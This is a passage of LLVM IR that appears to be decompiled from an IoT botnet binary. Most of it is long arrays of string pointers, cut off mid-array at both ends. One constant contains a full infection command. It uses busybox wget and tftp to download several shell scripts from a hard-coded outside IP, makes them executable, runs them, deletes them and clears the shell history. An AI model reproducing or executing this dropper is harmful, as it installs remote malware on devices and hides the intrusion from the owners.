@global_var_1cd58.670, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @global_var_1cdc4.671, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_1ce1c.672, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @global_var_1ce6c.673, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @global_var_1ce90.674, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_1ceec.675, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @global_var_1cefc.676, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @global_var_1cf2c.677, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @global_var_1cf50.678, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @global_var_1cf74.679, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @global_var_1cf90.680, i32 0, i32 0), i8* getelementptr inbounds ([140 x i8], [140 x i8]* @global_var_1cfd0.681, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_1d05c.682, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_1d0a4.683, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_1d0ec.684, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_1d134.685, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @global_var_1d17c.686, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @global_var_1d1d0.687, i32 0, i32 0), i8* getelementptr inbounds ([105 x i8], [105 x i8]* @global_var_1d220.688, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @global_var_1d28c.689, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_1d2e0.690, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_1d33c.691, i32 0, i32 0), i8* getelementptr inbounds ([97 x i8], [97 x i8]* @global_var_1d398.692, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_1d3fc.693, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_1d458.694, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_1d4b4.695, i32 0, i32 0), i8* getelementptr inbounds ([96 x i8], [96 x i8]* @global_var_1d510.696, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @global_var_1d570.697, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @global_var_1d5b8.698, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @global_var_1d650.699, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_1d69c.700, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @global_var_1d6e8.701, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @global_var_1d738.702, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @global_var_1d780.703, i32 0, i32 0), i8* getelementptr inbounds ([79 x i8], [79 x i8]* @global_var_1d7d4.704, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @global_var_1d824.705, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @global_var_1d86c.706, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_1d8b8.707, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @global_var_1d904.708, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_1d94c.709, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_1d99c.710, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @global_var_1d9ec.711, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @global_var_1da20.712, i32 0, i32 0), i8* getelementptr inbounds ([72 x i8], [72 x i8]* @global_var_1da54.713, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1da9c.714, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1daa8.715, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1dab4.716, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1dabc.717, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1dac4.718, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1dad0.719, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1dadc.720, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1dae8.721, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1daf4.722, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1dafc.723, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1db08.724, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1db0c.725, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1db14.726, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1db1c.727, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1db24.728, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1db2c.729, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1db34.730, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1db3c.731, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1db44.732, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1db4c.733, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1db50.734, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1db58.735, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1db60.736, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1db6c.737, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1db74.738, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1db7c.739, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1db84.740, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1db8c.741, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1db94.742, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1db9c.743, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1dba4.744, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1dbac.745, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1dbb4.746, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1dbbc.747, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1dbc4.748, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1dbc8.749, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1dbd0.58, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1dbd4.750, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1dbdc.751, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1dbe4.752, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1dbec.753, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1dbf4.754, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1dbfc.755, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1dc00.756, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1dc04.757, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1dc0c.758, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1dc14.759, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1dc18.760, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1dc20.761, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1dc2c.762, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1dc3c.763, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1dc4c.764, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1dc58.765, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1dc68.766, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1dc74.767, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1dc80.768, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1dc8c.769, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1dc98.770, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1dca4.771, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_1dcb4.772, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1dcc8.773, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1dcd4.774, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1dce0.775, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1dcec.776, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1dcfc.777, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1dd08.778, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1dd14.779, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1dd1c.780, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1dd24.781, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1dd2c.782, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1dd34.783, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1dd3c.784, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1dd44.785, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1dd54.786, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1dd5c.787, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1dd68.788, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1dd70.789, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1dd7c.790, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1dd88.791, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1dd90.792, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1dd9c.793, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1dda4.794, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1ddac.795, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1ddb8.796, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1ddc4.797, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1ddd0.798, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1dde0.799, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1ddec.800, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1ddf8.801, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_1de04.802, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1de14.803, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1de20.804, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1de2c.805, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1de38.806, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1de40.807, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1de48.808, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1de54.809, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1de5c.810, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1de68.811, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1de74.812, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1de80.813, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1de8c.814, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1de98.815, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1dea4.816, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1deb0.817, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1debc.818, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1dec8.819, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1ded4.820, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1dee0.821, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1deec.822, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1def8.823, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1df04.824, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1df10.825, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1df1c.826, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1df28.827, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1df34.828, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1df40.829, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1df4c.830, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1df58.831, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1df64.832, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1df70.833, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1df80.834, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1df8c.835, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1df98.836, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1dfa4.837, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1dfb0.838, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1dfbc.839, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1dfc8.840, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1dfd4.841, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1dfe0.842, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1dfec.843, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1dff8.844, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1e004.845, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1e010.846, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1e020.847, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1e030.848, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1e03c.849, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1e04c.850, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1e05c.851, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1e06c.852, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_1e078.853, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1e090.854, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1e09c.855, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1e0a8.856, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1e0b4.857, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1e0c0.858, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1e0d0.859, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1e0dc.860, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1e0ec.861, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1e0f8.862, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1e104.863, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1e110.864, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1e120.865, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1e12c.866, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1e13c.867, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1e148.868, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1e154.869, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1e160.870, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1e16c.871, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1e178.872, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1e188.873, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1e194.874, i32 0, i32 0)]
@global_var_1b3b0.881 = constant [8 x i8] c"busybox\00"
@global_var_29078.882 = global [10 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1b378.43, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1b380.44, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1b388.45, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1b394.46, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1b39c.47, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1b3a4.48, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1b3ac.49, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1b3b0.881, i32 0, i32 0), i8* bitcast ([10 x i8*]* @global_var_1b3b8.37 to i8*), i8* bitcast (i32* @global_var_1b3bc.38 to i8*)]
@global_var_1f4c8.885 = constant i32 926112539
@global_var_1f508.887 = constant [447 x i8] c"cd /tmp || cd /var/system || cd /mnt || cd /lib;rm -f /tmp/ || /var/run/ || /var/system/ || /mnt/ || /lib/;cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;busybox wget http://185.158.113.30/UqHDZbqr9S.sh;chmod 777;sh UqHDZbqr9S.sh;busybox tftp -g 185.158.113.30 -r EeckYqY9dV.sh;chmod 777 ;sh EeckYqY9dV.sh;busybox tftp -g 185.158.113.30 -r FRw5K9b9sb.sh;chmod 777 ;sh FRw5K9b9sb.sh;rm -rf *sh;history -c;history -w;rm -rf ~/.bash_history\0D\0A\00"
@global_var_292f8.893 = global [162 x i8*] [i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1da9c.714, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1daa8.715, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1dab4.716, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1dabc.717, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1dac4.718, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1dad0.719, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1dadc.720, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1dae8.721, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1daf4.722, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1dafc.723, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1db08.724, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1db0c.725, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1db14.726, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1db1c.727, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1db24.728, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1db2c.729, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1db34.730, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1db3c.731, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1db44.732, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1db4c.733, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1db50.734, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1db58.735, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1db60.736, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1db6c.737, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1db74.738, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1db7c.739, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1db84.740, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1db8c.741, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1db94.742, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1db9c.743, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1dba4.744, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1dbac.745, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1dbb4.746, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1dbbc.747, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1dbc4.748, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1dbc8.749, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1dbd0.58, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1dbd4.750, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1dbdc.751, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1dbe4.752, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1dbec.753, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1dbf4.754, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1dbfc.755, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1dc00.756, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1dc04.757, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1dc0c.758, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1dc14.759, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1dc18.760, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1dc20.761, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1dc2c.762, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1dc3c.763, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1dc4c.764, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1dc58.765, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1dc68.766, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1dc74.767, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1dc80.768, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1dc8c.769, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1dc98.770, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1dca4.771, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_1dcb4.772, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1dcc8.773, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1dcd4.774, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1dce0.775, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1dcec.776, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1dcfc.777, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1dd08.778, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1dd14.779, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1dd1c.780, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1dd24.781, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1dd2c.782, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1dd34.783, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1dd3c.784, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1dd44.785, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1dd54.786, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1dd5c.787, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1dd68.788, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* 